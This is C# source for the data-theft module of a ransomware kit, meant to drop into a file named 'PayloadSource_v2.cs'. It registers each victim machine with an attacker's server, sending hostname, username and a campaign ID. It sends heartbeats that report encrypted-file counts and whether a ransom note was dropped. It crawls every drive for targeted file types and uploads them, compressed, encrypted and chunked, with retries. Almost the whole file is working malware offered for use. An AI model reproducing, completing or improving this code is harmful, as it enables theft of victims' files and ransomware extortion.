// =====================================================================
// EXFILTRATION MODULE - Full Dashboard Integration (UPDATED)
// =====================================================================
// Drop-in replacement for Exfiltration class in PayloadSource_v2.cs
// Features:
// - System registration on first run (with optimistic locking support)
// - Heartbeat with stats updates (rate-limit aware)
// - File exfiltration with metadata (chunked upload for large files)
// - Ransom note tracking
// - Encrypted payload support
// - SHA256 deduplication
// - Automatic retry with backoff on 429/413

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

internal static class Exfiltration
{
    private static string _systemId = null;
    private static bool _registered = false;
    private static DateTime _lastHeartbeat = DateTime.MinValue;
    private static readonly object _lock = new object();
    private static readonly HttpClient _httpClient = new HttpClient();
    private static int _consecutiveFailures = 0;
    private static DateTime _lastBackoff = DateTime.MinValue;

    static Exfiltration()
    {
        _httpClient.Timeout = TimeSpan.FromSeconds(30);
    }

    public static void Run()
    {
        if (!Config.ExfilEnabled) return;

        try
        {
            // Register system on first run
            if (!_registered)
            {
                RegisterSystem();
            }

            // Send periodic heartbeat
            SendHeartbeat();

            // Collect and exfiltrate files
            var files = CollectFiles();
            if (files.Count > 0)
            {
                foreach (var file in files)
                {
                    try { UploadFile(file); }
                    catch (Exception ex) 
                    { 
                        LogDebug($"Upload failed for {file}: {ex.Message}");
                        // Continue on upload failure
                    }
                }
            }
        }
        catch (Exception ex)
        {
            LogDebug($"Exfiltration.Run error: {ex.Message}");
        }
    }

    private static void RegisterSystem()
    {
        lock (_lock)
        {
            if (_registered) return;

            try
            {
                var sysInfo = new Dictionary<string, string>
                {
                    ["hostname"] = Environment.MachineName,
                    ["username"] = Environment.UserName,
                    ["os"] = GetOSVersion(),
                    ["campaignId"] = ExtractCampaignId(Config.ExfilApiKey)
                };

                string json = SerializeSystemRegistration(Config.ExfilApiKey, sysInfo);
                
                var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/systems";
                var request = new HttpRequestMessage(HttpMethod.Post, requestUri)
                {
                    Content = new StringContent(json, Encoding.UTF8, "application/json")
                };
                request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", Config.ExfilApiKey);

                var response = _httpClient.SendAsync(request).Result;
                string respJson = response.Content.ReadAsStringAsync().Result;

                if (response.IsSuccessStatusCode)
                {
                    _systemId = ExtractSystemId(respJson);
                    _registered = true;
                    _consecutiveFailures = 0;
                    LogDebug($"System registered: {_systemId}");
                }
                else if ((int)response.StatusCode == 409) // Conflict - already registered
                {
                    // Try to extract systemId from error response
                    _systemId = ExtractSystemId(respJson) ?? $"sys_{Environment.MachineName}_{Environment.UserName}";
                    _registered = true;
                    LogDebug($"System already registered: {_systemId}");
                }
                else
                {
                    LogDebug($"Registration failed: {response.StatusCode} - {respJson}");
                }
            }
            catch (Exception ex)
            {
                LogDebug($"Registration error: {ex.Message}");
            }
        }
    }

    private static void SendHeartbeat()
    {
        if (string.IsNullOrEmpty(_systemId)) return;
        
        // Throttle heartbeats to once per minute (server also enforces 60/min)
        if ((DateTime.Now - _lastHeartbeat).TotalMinutes < 1) return;

        // Respect server-side backoff
        if (_consecutiveFailures > 0 && (DateTime.Now - _lastBackoff).TotalSeconds < 60)
        {
            return;
        }

        try
        {
            var stats = new Dictionary<string, object>
            {
                ["filesEncrypted"] = GetEncryptedCount(),
                ["filesExfiltrated"] = GetExfiltratedCount(),
                ["bytesExfiltrated"] = GetExfiltratedBytes(),
                ["ransomNoteDropped"] = RansomNoteDropped()
            };

            string json = SerializeHeartbeat(_systemId, stats);

            var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/systems";
            var request = new HttpRequestMessage(HttpMethod.Put, requestUri)
            {
                Content = new StringContent(json, Encoding.UTF8, "application/json")
            };
            request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", Config.ExfilApiKey);

            var response = _httpClient.SendAsync(request).Result;
            
            if (response.IsSuccessStatusCode)
            {
                _lastHeartbeat = DateTime.Now;
                _consecutiveFailures = 0;
            }
            else if ((int)response.StatusCode == 429)
            {
                HandleRateLimit(response);
            }
            else
            {
                _consecutiveFailures++;
            }
        }
        catch (Exception ex)
        {
            LogDebug($"Heartbeat error: {ex.Message}");
            _consecutiveFailures++;
        }
    }

    private static List<string> CollectFiles()
    {
        var result = new List<string>();
        long maxSize = (long)Config.ExfilMaxFileSizeMB * 1024 * 1024;
        int count = 0;

        foreach (var drive in DriveInfo.GetDrives())
        {
            if (!drive.IsReady) continue;
            if (count >= Config.ExfilMaxFiles) break;

            try
            {
                CollectFromDirectory(drive.Name, result, maxSize, ref count);
            }
            catch { }
        }

        return result;
    }

    private static void CollectFromDirectory(string path, List<string> result, long maxSize, ref int count)
    {
        if (count >= Config.ExfilMaxFiles) return;

        try
        {
            foreach (string file in Directory.EnumerateFiles(path))
            {
                if (count >= Config.ExfilMaxFiles) break;

                try
                {
                    string ext = Path.GetExtension(file);
                    
                    // Check skip extensions first
                    bool shouldSkip = false;
                    foreach (string skipExt in Config.ExfilSkipExtensions)
                    {
                        if (string.Equals(ext, skipExt, StringComparison.OrdinalIgnoreCase))
                        {
                            shouldSkip = true;
                            break;
                        }
                    }
                    if (shouldSkip) continue;

                    // Check target extensions
                    bool match = false;
                    foreach (string targetExt in Config.ExfilTargetExtensions)
                    {
                        if (string.Equals(ext, targetExt, StringComparison.OrdinalIgnoreCase))
                        {
                            match = true;
                            break;
                        }
                    }
                    if (!match) continue;

                    // Check file size
                    var fi = new FileInfo(file);
                    if (fi.Length > maxSize) continue;
                    if (fi.Length == 0) continue;

                    // Skip system files
                    if (ShouldSkipFile(file)) continue;

                    result.Add(file);
                    count++;
                }
                catch { }
            }

            foreach (string subDir in Directory.EnumerateDirectories(path))
            {
                if (count >= Config.ExfilMaxFiles) break;
                try
                {
                    new DirectoryInfo(subDir).Attributes &= ~FileAttributes.ReadOnly;
                    CollectFromDirectory(subDir, result, maxSize, ref count);
                }
                catch { }
            }
        }
        catch { }
    }

    private static bool ShouldSkipFile(string path)
    {
        string lower = path.ToLowerInvariant();
        string[] skip = { 
            "appdata\\local", "appdata\\locallow", "users\\all users", "programdata",
            "windows", "recycle.bin", "system volume information",
            "boot.ini", "bootfont.bin", "iconcache.db", "ntuser.dat", 
            "ntuser.dat.log", "ntuser.ini", "thumbs.db", "autorun.inf", 
            "bootsect.bak", "bootmgfw.efi", "desktop.ini", "pagefile.sys",
            "hiberfil.sys", "swapfile.sys"
        };
        foreach (string s in skip)
            if (lower.Contains(s)) return true;
        return false;
    }

    private static void UploadFile(string filePath)
    {
        int maxRetries = Config.ExfilRetryCount + 2; // Extra retries for chunked fallback
        
        for (int attempt = 0; attempt <= maxRetries; attempt++)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                long originalSize = fileData.Length;
                
                // Compress if enabled
                if (Config.ExfilCompress)
                {
                    fileData = Compress(fileData);
                }
                
                // Encrypt if enabled (use same hybrid encryption)
                if (Config.ExfilEncrypt && Config.UseHybridEncryption)
                {
                    string tempEnc = Path.Combine(Path.GetTempPath(), SecureRandomName(12) + ".enc");
                    Crypto.EncryptFile(filePath, tempEnc);
                    fileData = File.ReadAllBytes(tempEnc);
                    try { File.Delete(tempEnc); } catch { }
                }

                // Calculate SHA256 for deduplication
                string fileHash = ComputeSHA256(fileData);
                string fileName = Path.GetFileName(filePath);

                // Try single-chunk upload first
                var result = TryUploadChunk(filePath, fileName, fileData, fileHash, 0, 1, originalSize);
                
                if (result == UploadResult.Success)
                {
                    SendHeartbeat(); // Update stats after successful upload
                    break;
                }
                else if (result == UploadResult.NeedsChunking)
                {
                    // Server rejected due to size - retry with chunked upload
                    LogDebug($"File {fileName} too large for single upload ({originalSize} bytes), trying chunked...");
                    UploadFileChunked(filePath, fileName, fileData, fileHash, originalSize);
                    break;
                }
                else if (result == UploadResult.RateLimited)
                {
                    // Backoff handled in TryUploadChunk
                    if (attempt < maxRetries)
                    {
                        Thread.Sleep(5000); // Additional wait
                        continue;
                    }
                }
                else
                {
                    // Other error - retry
                    if (attempt < maxRetries)
                    {
                        Thread.Sleep(Config.ExfilRetryDelaySeconds * 1000);
                    }
                }
            }
            catch (Exception ex)
            {
                LogDebug($"Upload error for {filePath}: {ex.Message}");
                if (attempt < maxRetries)
                {
                    Thread.Sleep(Config.ExfilRetryDelaySeconds * 1000);
                }
            }
        }
    }

    private enum UploadResult { Success, NeedsChunking, RateLimited, Error }

    private static UploadResult TryUploadChunk(string filePath, string fileName, byte[] fileData, string fileHash, int chunkIndex, int totalChunks, long originalSize)
    {
        try
        {
            var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/exfil/upload";
            var request = new HttpRequestMessage(HttpMethod.Post, requestUri)
            {
                Content = new ByteArrayContent(fileData)
            };
            
            request.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
            request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", Config.ExfilApiKey);
            
            if (!string.IsNullOrEmpty(_systemId))
            {
                request.Content.Headers.Add("X-System-Id", _systemId);
            }
            request.Content.Headers.Add("X-File-Name", fileName);
            request.Content.Headers.Add("X-Chunk-Index", chunkIndex.ToString());
            request.Content.Headers.Add("X-Total-Chunks", totalChunks.ToString());
            request.Content.Headers.Add("X-File-Hash", fileHash);

            var response = _httpClient.SendAsync(request).Result;
            string respJson = response.Content.ReadAsStringAsync().Result;

            if (response.IsSuccessStatusCode)
            {
                _consecutiveFailures = 0;
                return UploadResult.Success;
            }
            else if ((int)response.StatusCode == 413) // Payload Too Large
            {
                return UploadResult.NeedsChunking;
            }
            else if ((int)response.StatusCode == 429) // Rate Limited
            {
                HandleRateLimit(response);
                return UploadResult.RateLimited;
            }
            else
            {
                LogDebug($"Upload failed: {response.StatusCode} - {respJson}");
                return UploadResult.Error;
            }
        }
        catch (Exception ex)
        {
            LogDebug($"TryUploadChunk error: {ex.Message}");
            return UploadResult.Error;
        }
    }

    private static void UploadFileChunked(string filePath, string fileName, byte[] fileData, string fileHash, long originalSize)
    {
        const int CHUNK_SIZE = 90 * 1024; // 90KB per chunk (server limit ~100KB)
        int totalChunks = (int)Math.Ceiling((double)fileData.Length / CHUNK_SIZE);
        
        for (int i = 0; i < totalChunks; i++)
        {
            int offset = i * CHUNK_SIZE;
            int length = Math.Min(CHUNK_SIZE, fileData.Length - offset);
            byte[] chunk = new byte[length];
            Array.Copy(fileData, offset, chunk, 0, length);

            int retries = 3;
            while (retries > 0)
            {
                var result = TryUploadChunk(filePath, fileName, chunk, fileHash, i, totalChunks, originalSize);
                if (result == UploadResult.Success)
                {
                    break;
                }
                else if (result == UploadResult.RateLimited)
                {
                    Thread.Sleep(5000);
                    retries--;
                }
                else
                {
                    Thread.Sleep(2000);
                    retries--;
                }
            }
        }
        
        // Final heartbeat to update stats
        SendHeartbeat();
    }

    private static void HandleRateLimit(HttpResponseMessage response)
    {
        _consecutiveFailures++;
        _lastBackoff = DateTime.Now;
        
        // Check Retry-After header
        if (response.Headers.TryGetValues("Retry-After", out var values))
        {
            if (int.TryParse(values.FirstOrDefault(), out int retryAfter))
            {
                LogDebug($"Rate limited, waiting {retryAfter}s");
                Thread.Sleep(Math.Min(retryAfter * 1000, 60000)); // Cap at 60s
                return;
            }
        }
        
        // Exponential backoff
        int backoff = Math.Min(1000 * (int)Math.Pow(2, _consecutiveFailures), 60000);
        LogDebug($"Rate limited, backing off {backoff}ms");
        Thread.Sleep(backoff);
    }

    private static byte[] Compress(byte[] data)
    {
        using (var output = new MemoryStream())
        {
            using (var gzip = new GZipStream(output, CompressionLevel.Optimal))
            {
                gzip.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
    }

    private static string ComputeSHA256(byte[] data)
    {
        using (var sha256 = SHA256.Create())
        {
            byte[] hash = sha256.ComputeHash(data);
            return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
        }
    }

    private static string SecureRandomName(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var random = new Random();
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }

    // ============ HELPER METHODS ============

    private static string GetOSVersion()
    {
        try { return Environment.OSVersion.VersionString; }
        catch { return "Windows"; }
    }

    private static string ExtractCampaignId(string apiKey)
    {
        if (apiKey.StartsWith("ck_")) return apiKey.Substring(3, Math.Min(12, apiKey.Length - 3));
        return "unknown";
    }

    private static string SerializeSystemRegistration(string apiKey, Dictionary<string, string> sysInfo)
    {
        var sb = new StringBuilder();
        sb.Append("{");
        sb.AppendFormat("\"campaignId\":\"{0}\",", EscapeJson(ExtractCampaignId(apiKey)));
        sb.AppendFormat("\"victimId\":\"{0}\",", EscapeJson(Environment.MachineName + "_" + Environment.UserName));
        sb.Append("\"systemInfo\":{");
        bool first = true;
        foreach (var kvp in sysInfo)
        {
            if (!first) sb.Append(",");
            sb.AppendFormat("\"{0}\":\"{1}\"", EscapeJson(kvp.Key), EscapeJson(kvp.Value));
            first = false;
        }
        sb.Append("}}");
        return sb.ToString();
    }

    private static string SerializeHeartbeat(string systemId, Dictionary<string, object> stats)
    {
        var sb = new StringBuilder();
        sb.Append("{");
        sb.AppendFormat("\"id\":\"{0}\",", EscapeJson(systemId));
        sb.Append("\"stats\":{");
        bool first = true;
        foreach (var kvp in stats)
        {
            if (!first) sb.Append(",");
            if (kvp.Value is bool)
                sb.AppendFormat("\"{0}\":{1}", EscapeJson(kvp.Key), (bool)kvp.Value ? "true" : "false");
            else
                sb.AppendFormat("\"{0}\":{1}", EscapeJson(kvp.Key), kvp.Value);
            first = false;
        }
        sb.Append("}}");
        return sb.ToString();
    }

    private static string ExtractSystemId(string json)
    {
        try
        {
            int idx = json.IndexOf("\"systemId\":\"");
            if (idx >= 0)
            {
                idx += 12;
                int end = json.IndexOf("\"", idx);
                return json.Substring(idx, end - idx);
            }
        }
        catch { }
        return null;
    }

    private static string EscapeJson(string input)
    {
        if (string.IsNullOrEmpty(input)) return "";
        return input.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "\\n").Replace("\t", "\\t");
    }

    private static void LogDebug(string message)
    {
        // In production, hook into your logging framework
        // Console.WriteLine($"[EXFIL] {DateTime.Now:HH:mm:ss} {message}");
    }

    // Counters - would be tracked by encryption engine in real implementation
    private static int GetEncryptedCount() { return 0; } // TODO: Hook into EncryptionEngine
    private static int GetExfiltratedCount() { return 0; } // TODO: Track uploads
    private static long GetExfiltratedBytes() { return 0; } // TODO: Track bytes
    private static bool RansomNoteDropped() { return false; } // TODO: Track
}